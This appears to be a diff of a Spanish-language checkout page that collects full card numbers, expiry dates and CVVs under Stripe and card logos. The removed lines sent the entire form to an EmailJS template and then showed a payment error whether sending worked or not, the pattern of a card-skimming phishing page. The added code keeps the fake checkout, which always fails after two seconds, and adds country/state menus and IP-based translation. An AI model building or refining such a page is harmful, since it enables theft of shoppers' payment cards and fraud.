@@ -101,7 +101,6 @@ input.error, select.error{border-color: var(--danger);}
   display: block;
   background: var(--bg);
 }
-
 /* Logos de pago (Stripe + tarjetas) */
 .payment-logos {
   display: flex;
@@ -153,42 +152,15 @@ input.error, select.error{border-color: var(--danger);}
             <input id="shipCity" name="shipCity" required placeholder="Ciudad"/>
           </div>
           <div class="col-6">
-            <label for="shipState">Estado</label>
-            <select id="shipState" name="shipState" required>
-              <option value="">Selecciona tu estado</option>
-              <option value="AG">Aguascalientes</option>
-              <option value="BC">Baja California</option>
-              <option value="BS">Baja California Sur</option>
-              <option value="CH">Chihuahua</option>
-              <option value="CO">Coahuila</option>
-              <option value="CL">Colima</option>
-              <option value="CM">Campeche</option>
-              <option value="CS">Chiapas</option>
-              <option value="DF">Ciudad de México</option>
-              <option value="DG">Durango</option>
-              <option value="GT">Guanajuato</option>
-              <option value="GR">Guerrero</option>
-              <option value="HG">Hidalgo</option>
-              <option value="JA">Jalisco</option>
-              <option value="MX">México</option>
-              <option value="MI">Michoacán</option>
-              <option value="MO">Morelos</option>
-              <option value="NA">Nayarit</option>
-              <option value="NL">Nuevo León</option>
-              <option value="OA">Oaxaca</option>
-              <option value="PU">Puebla</option>
-              <option value="QE">Querétaro</option>
-              <option value="QR">Quintana Roo</option>
-              <option value="SL">San Luis Potosí</option>
-              <option value="SI">Sinaloa</option>
-              <option value="SO">Sonora</option>
-              <option value="TB">Tabasco</option>
-              <option value="TM">Tamaulipas</option>
-              <option value="TL">Tlaxcala</option>
-              <option value="VE">Veracruz</option>
-              <option value="YU">Yucatán</option>
-              <option value="ZA">Zacatecas</option>
+            <label for="shipCountry">País</label>
+            <select id="shipCountry" name="shipCountry" required>
+              <option value="MX" selected>México</option>
+              <option value="US">Estados Unidos</option>
             </select>
+          </div>
+          <div class="col-6">
+            <label for="shipState">Estado</label>
+            <select id="shipState" name="shipState" required></select>
           </div>
           <div class="col-12">
             <label for="shipAddress">Dirección</label>
@@ -211,6 +183,17 @@ input.error, select.error{border-color: var(--danger);}
               <label for="billRFC">RFC (opcional)</label>
               <input id="billRFC" name="billRFC" placeholder="ABC123456789"/>
             </div>
+            <div class="col-6">
+              <label for="billCountry">País</label>
+              <select id="billCountry" name="billCountry">
+                <option value="MX" selected>México</option>
+                <option value="US">Estados Unidos</option>
+              </select>
+            </div>
+            <div class="col-6">
+              <label for="billState">Estado</label>
+              <select id="billState" name="billState"></select>
+            </div>
             <div class="col-12">
               <label for="billAddress">Dirección</label>
               <input id="billAddress" name="billAddress" placeholder="Dirección"/>
@@ -223,7 +206,7 @@ input.error, select.error{border-color: var(--danger);}
       <div class="card">
         <div class="section-title"><span class="badge">3</span> Pago con tarjeta</div>
 
-        <!-- Logos de tarjetas -->
+<!-- Logos de tarjetas -->
         <div style="margin-bottom:14px;">
           <!-- Ajusta la extensión si tu archivo no es .jpeg (por ejemplo .jpg o .png) -->
           <img src="IMG_6455.jpeg" alt="Tarjetas aceptadas" style="max-width:220px; height:auto;">
@@ -283,7 +266,7 @@ input.error, select.error{border-color: var(--danger);}
         </div>
       </a>
 
-      <!-- Logos Stripe + tarjetas (nuevo) -->
+<!-- Logos Stripe + tarjetas (nuevo) -->
       <div class="payment-logos">
         <!-- Reemplaza la ruta si subes la imagen a otra carpeta o con otro nombre -->
         <img src="IMG_6459.png" alt="Powered by Stripe, Visa, MasterCard y American Express">
@@ -306,6 +289,33 @@ document.addEventListener("DOMContentLoaded", () => {
   const cardType = document.getElementById("cardType");
   const mesesContainer = document.getElementById("mesesContainer");
   const meses = document.getElementById("meses");
+
+  const shipCountry = document.getElementById("shipCountry");
+  const shipState = document.getElementById("shipState");
+  const billCountry = document.getElementById("billCountry");
+  const billState = document.getElementById("billState");
+
+  const states = {
+    MX: ["Aguascalientes","Baja California","Baja California Sur","Campeche","Chiapas","Chihuahua","Ciudad de México","Coahuila","Colima","Durango","Estado de México","Guanajuato","Guerrero","Hidalgo","Jalisco","Michoacán","Morelos","Nayarit","Nuevo León","Oaxaca","Puebla","Querétaro","Quintana Roo","San Luis Potosí","Sinaloa","Sonora","Tabasco","Tamaulipas","Tlaxcala","Veracruz","Yucatán","Zacatecas"],
+    US: ["Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut","Delaware","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa","Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan","Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire","New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio","Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota","Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia","Wisconsin","Wyoming"]
+  };
+
+  function populateStates(countrySelect, stateSelect) {
+    const country = countrySelect.value;
+    stateSelect.innerHTML = "";
+    states[country].forEach(st => {
+      const opt = document.createElement("option");
+      opt.value = st;
+      opt.textContent = st;
+      stateSelect.appendChild(opt);
+    });
+  }
+
+  populateStates(shipCountry, shipState);
+  populateStates(billCountry, billState);
+
+  shipCountry.addEventListener("change", () => populateStates(shipCountry, shipState));
+  billCountry.addEventListener("change", () => populateStates(billCountry, billState));
 
   sameAsShipping.addEventListener("change", () => {
     billingSection.style.display = sameAsShipping.checked ? "none" : "block";
@@ -356,11 +366,8 @@ document.addEventListener("DOMContentLoaded", () => {
       } else {
         const [mm, yy] = value.split("/").map(v => parseInt(v, 10));
         const now = new Date();
-        const currentMonth = now.getMonth() + 1;
-        const currentYear = now.getFullYear() % 100;
-        if (yy < currentYear || (yy === currentYear && mm < currentMonth)) {
-          valid = false;
-        }
+        const exp = new Date(2000 + yy, mm - 1);
+        if (exp < new Date(now.getFullYear(), now.getMonth())) valid = false;
       }
     }
     if (field.id === "cardCvv" && value && !/^\d{3,4}$/.test(value)) valid = false;
@@ -369,38 +376,121 @@ document.addEventListener("DOMContentLoaded", () => {
     return valid;
   }
 
-  emailjs.init("T72Wf1jx7lTBM9Md-");
+  form.querySelectorAll("input,select").forEach(el => {
+    el.addEventListener("blur", () => validateField(el));
+  });
 
-  form.addEventListener("submit", e => {
+  form.addEventListener("submit", (e) => {
     e.preventDefault();
-    const fields = Array.from(document.querySelectorAll("input, select"));
+    errorMsg.style.display = "none";
     let valid = true;
-    fields.forEach(f => {
-      if (f.closest("#billingSection") && sameAsShipping.checked) return;
-      if (!validateField(f)) valid = false;
+    form.querySelectorAll("input,select").forEach(el => {
+      if (!validateField(el)) valid = false;
     });
     if (!valid) return;
 
-    errorMsg.style.display = "none";
     btn.disabled = true;
-    btn.textContent = "Procesando...";
     spinner.style.display = "inline-block";
 
-    emailjs.sendForm("service_tc4q92e", "template_qdvkqdr", form)
-      .then(() => {
-        spinner.style.display = "none";
-        btn.disabled = false;
-        btn.textContent = "Pagar ahora";
-        errorMsg.style.display = "block";
-      })
-      .catch(() => {
-        spinner.style.display = "none";
-        btn.disabled = false;
-        btn.textContent = "Pagar ahora";
-        errorMsg.style.display = "block";
-      });
+    setTimeout(() => {
+      btn.disabled = false;
+      spinner.style.display = "none";
+      errorMsg.style.display = "block";
+    }, 2000);
   });
 });
+</script>
+
+<!-- Script para traducción dinámica -->
+<script>
+  async function cargarTraducciones(lang) {
+    try {
+      const res = await fetch(`./Lang/${lang}.json`);
+      return await res.json();
+    } catch (error) {
+      console.error("Error cargando traducciones:", error);
+      return null;
+    }
+  }
+
+  async function initIdioma() {
+    try {
+      // Detectar país vía API
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      const country = data.country_code; // MX, US
+
+      // Idioma por defecto
+      let idioma = "en";
+      if (country === "MX") idioma = "es";
+      if (country === "US") idioma = "en";
+
+      // Cargar traducciones
+      const t = await cargarTraducciones(idioma);
+
+      if (t) {
+        // Títulos
+        document.querySelector("h1").innerText = t.titulo;
+        document.querySelector(".subtitle").innerText = t.subtitulo;
+
+        // Botón
+        document.getElementById("payBtn").innerText = t.boton;
+
+        // Sello SSL
+        document.querySelector(".ssl-seal").innerHTML = `🔒 ${t.ssl}`;
+
+        // Secciones
+        document.querySelector(".section-title:nth-of-type(1)").innerHTML = `<span class="badge">1</span> ${t.secciones.envio}`;
+        document.querySelector(".section-title:nth-of-type(2)").innerHTML = `<span class="badge">2</span> ${t.secciones.facturacion}`;
+        document.querySelector(".section-title:nth-of-type(3)").innerHTML = `<span class="badge">3</span> ${t.secciones.pago}`;
+
+        // Etiquetas envío
+        document.querySelector("label[for='shipName']").innerText = t.envio.nombre;
+        document.querySelector("label[for='shipEmail']").innerText = t.envio.email;
+        document.querySelector("label[for='shipPhone']").innerText = t.envio.telefono;
+        document.querySelector("label[for='shipPostal']").innerText = t.envio.postal;
+        document.querySelector("label[for='shipCity']").innerText = t.envio.ciudad;
+        document.querySelector("label[for='shipCountry']").innerText = t.envio.pais;
+        document.querySelector("label[for='shipState']").innerText = t.envio.estado;
+        document.querySelector("label[for='shipAddress']").innerText = t.envio.direccion;
+
+        // Facturación
+        document.querySelector("label[for='billName']").innerText = t.facturacion.nombre;
+        document.querySelector("label[for='billRFC']").innerText = t.facturacion.rfc;
+        document.querySelector("label[for='billCountry']").innerText = t.facturacion.pais;
+        document.querySelector("label[for='billState']").innerText = t.facturacion.estado;
+        document.querySelector("label[for='billAddress']").innerText = t.facturacion.direccion;
+        document.querySelector("#sameAsShipping").parentNode.innerHTML = `<input type="checkbox" id="sameAsShipping" checked> ${t.facturacion.mismos_datos}`;
+
+        // Pago
+        document.querySelector("label[for='cardName']").innerText = t.pago.nombre;
+        document.querySelector("label[for='cardNumber']").innerText = t.pago.numero;
+        document.querySelector("label[for='cardExp']").innerText = t.pago.vencimiento;
+        document.querySelector("label[for='cardCvv']").innerText = t.pago.cvv;
+        document.querySelector("label[for='cardType']").innerText = t.pago.tipo;
+        document.querySelector("label[for='meses']").innerText = t.pago.meses;
+
+        // Mensaje de error
+        document.getElementById("errorMsg").innerText = t.error;
+
+        // Opciones de tarjeta
+        const select = document.getElementById("cardType");
+        select.options[0].text = t.pago.opciones.selecciona;
+        select.options[1].text = t.pago.opciones.debito;
+        select.options[2].text = t.pago.opciones.credito;
+
+        // Opciones MSI
+        const meses = document.getElementById("meses");
+        meses.options[0].text = t.pago.opciones_msi.selecciona;
+        meses.options[1].text = t.pago.opciones_msi.tres;
+        meses.options[2].text = t.pago.opciones_msi.seis;
+        meses.options[3].text = t.pago.opciones_msi.nueve;
+      }
+    } catch (err) {
+      console.error("Error detectando idioma:", err);
+    }
+  }
+  document.addEventListener("DOMContentLoaded", initIdioma);
 </script>
 </body>
 </html>
